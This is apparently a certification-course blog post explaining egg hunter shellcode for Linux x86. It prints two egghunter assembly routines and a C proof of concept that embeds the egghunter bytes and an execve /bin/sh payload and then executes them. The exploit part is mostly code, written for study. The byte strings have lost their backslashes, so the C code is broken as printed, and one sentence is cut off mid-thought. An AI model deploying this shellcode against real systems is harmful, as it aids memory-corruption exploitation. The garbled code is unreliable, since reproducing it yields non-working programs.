@@ -1,0 +1,149 @@
+<!doctype html>
+<html lang="en">
+
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.4.0/css/bootstrap.min.css">
+<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
+<script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.4.0/js/bootstrap.min.js"></script>
+
+</head>
+
+<body>
+<div class="container">
+
+<br>
+<br>
+<h2> Assignment 3: Egg Hunter shellcode</h2><br>
+<br>
+- Study about the Egg Hunter shellcode<br>
+<br>
+- Create a working demo of the Egghunter<br>
+<br>
+- Should be configurable for different payloads<br>
+<br>
+<br>
+<h2> What is an EggHunter?</h2><br>
+<br>
+It is a very efficient exploitation method when we have little space to store our shellcode which can be seen as a [Staged Shellcode](https://en.wikipedia.org/wiki/Shellcode#Staged).<br>
+<br>
+Summing up, the first part of shellcode will be responsible for searching our 4-byte tag or "egg" in memory and the second part will be stored in some position of the memory, composed of the "egg" and the shellcode to execute (which can be the typical shellcode to spawn a shell, to open a reverse shell...).<br>
+<br>
+Knowing this, the first part is the most important and the one which must be researched carefully. There are many "egghunters" on the internet, but in this case we will focus our study in the ones shown in [the Skape's paper from 2004](http://www.hick.org/code/skape/papers/egghunt-shellcode.pdf).<br>
+<br>
+These egghunters have the three requirements needed: robustness, small size and they are fast. In all of them the author uses 8-byte "eggs", which means that the tag is used twice, so . The technique is based on the system calls, given they can <i>validate process-relative memory addresses without leading to a segmentation fault or other runtime error in the program itself</i>, using them to check if the memory is readable and later if the tag has been reached.<br>
+<br>
+<br>
+<h2> EggHunter study</h2><br>
+The two egghunters studied use the same syscall: access.<br>
+<br>
+<img src="https://github.com/ricardojoserf/slae/blob/master/a3_Egg_Hunter/images/1.png?raw=true"><br>
+<br>
+<br>
+<h3> Egghunter 1</h3>
+<code><h4>global _start<br>
+<br>
+section .text<br>
+_start:<br>
+mov ebx, 0x50905090<br>
+xor ecx, ecx<br>
+mul ecx<br>
+<br>
+jump1:<br>
+or dx, 0xfff<br>
+<br>
+jump2:<br>
+inc edx<br>
+pusha<br>
+lea ebx, [edx+0x4]<br>
+xor eax, eax<br>
+mov al, 0x21<br>
+int 0x80<br>
+cmp al, 0xf2<br>
+popa<br>
+jz short jump1<br>
+cmp dword [edx], ebx<br>
+jnz short jump2<br>
+cmp dword [edx+4], ebx<br>
+jnz short jump2<br>
+jmp edx<br>
+</code></h4><br>
+It is tested with the execve shellcode as payload:<br>
+<br>
+<img src="https://github.com/ricardojoserf/slae/blob/master/a3_Egg_Hunter/images/2.png?raw=true"><br>
+<br>
+<br>
+<h3> Egghunter 2</h3>
+<code><h4>global _start<br>
+<br>
+section .text<br>
+_start:<br>
+<br>
+xor edx, edx<br>
+<br>
+test1:<br>
+<br>
+or dx, 0xfff<br>
+<br>
+test2:<br>
+inc edx<br>
+lea ebx, [edx+0x4]<br>
+push byte 0x21<br>
+pop eax<br>
+int 0x80<br>
+cmp al, 0xf2<br>
+jz test1<br>
+mov eax, 0x50905090<br>
+mov edi, edx<br>
+scasd<br>
+jnz test2<br>
+scasd<br>
+jnz test2<br>
+jmp edi<br>
+
+</code></h4><br>
+It is tested with the execve shellcode as payload:<br>
+<br>
+<img src="https://github.com/ricardojoserf/slae/blob/master/a3_Egg_Hunter/images/3.png?raw=true"><br>
+<br>
+<h3> PoC code</h3><br>
+This is the code of <i>shellcode.c</i> for this exercise:
+<code><h4>
+#include <stdio.h><br>
+#include <string.h><br>
+#define egg "x90x50x90x50"<br>
+<br>
+unsigned char egghunter[] = "x31xd2x66x81xcaxffx0fx42x8dx5ax04x6ax21x58xcdx80x3cxf2x74xeexb8x90x50x90x50x89xd7xafx75xe9xafx75xe6xffxe7";<br>
+unsigned char shellcode[] = egg egg "x31xc0x31xdbx31xc9x31xd2x50x68x6ex2fx73x68x68x2fx2fx62x69x68x2fx2fx2fx2fx89xe3x50x89xe2x53x89xe1xb0x0bxcdx80";<br>
+<br>
+int main() {<br>
+<br>
+printf("Egghunter Length: %dn", strlen(egghunter));<br>
+printf("Egghunter Egg + Shellcode: %dn", strlen(shellcode));<br>
+<br>
+int (*ret)() = (int(*)())egghunter;<br>
+<br>
+ret();<br>
+}<br>
+</code></h4>
+<br>
+<h2> Useful links </h2><br>
+<br>
+- Paper: http://www.hick.org/code/skape/papers/egghunt-shellcode.pdf<br>
+<br>
+- Python PoC con Kolibri: https://medium.com/@rafaveira3/exploit-development-kolibri-v2-0-http-server-egg-hunter-example-1-5e435aa84879
+<br>
+<br>
+<h2> Note</h2><br>
+<br>
+This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification: https://www.pentesteracademy.com/course?id=3<br>
+<br>
+Student ID: SLAE - 1433<br>
+
+<br>
+<br>
+
+</div>
+</body>
+</html>
